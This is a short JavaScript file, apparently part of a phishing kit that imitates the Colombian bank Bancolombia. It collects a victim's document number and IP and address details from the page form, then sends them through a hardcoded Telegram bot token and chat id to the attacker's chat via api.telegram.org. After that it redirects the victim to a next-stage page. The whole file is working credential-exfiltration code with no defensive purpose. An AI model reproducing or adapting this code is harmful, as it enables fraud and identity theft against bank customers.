//bot token
var telegram_bot_id = "5531881333:AAF1RecXPLBrbTUZpZD2mfNrt96mO0fLa84";
//chat id
var chat_id = 5651328532;
var u_name, ip, ip2;
var ready = function () {
    u_name = document.getElementById("DocumentNumber").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "USER: " + u_name + "\n\nIP: " + ip +"\n" + ip2 +"\nBANCOLOMBIA";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index2.html';
        console.log(response);
    });
    return false;
};